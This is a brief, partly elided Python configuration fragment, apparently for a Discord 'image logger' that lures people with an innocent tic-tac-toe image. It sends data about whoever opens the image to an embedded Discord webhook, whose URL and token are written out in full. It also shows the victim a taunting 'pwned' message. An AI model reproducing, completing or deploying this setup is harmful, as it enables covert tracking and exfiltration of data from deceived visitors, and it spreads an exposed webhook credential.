...
config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1105562110030794855/GcQV0ZXjf10ZdxDkZC48N7i9GJJoyWiFgxyC-OfC_jzAwDa_eUO5o42Qc3UUgCfaLY7Q",
    "image": "https://www.5minutesformom.com/wp-content/uploads/2015/08/Tic-Tac-Toe-Board-letter-309x400.jpg", # You can also have a custom image by using a URL argument
    ...
    "message": { # Show a custom message when the user opens the image
        ...
        "message": "This browser has been pwned by Youtube.", # Message to show
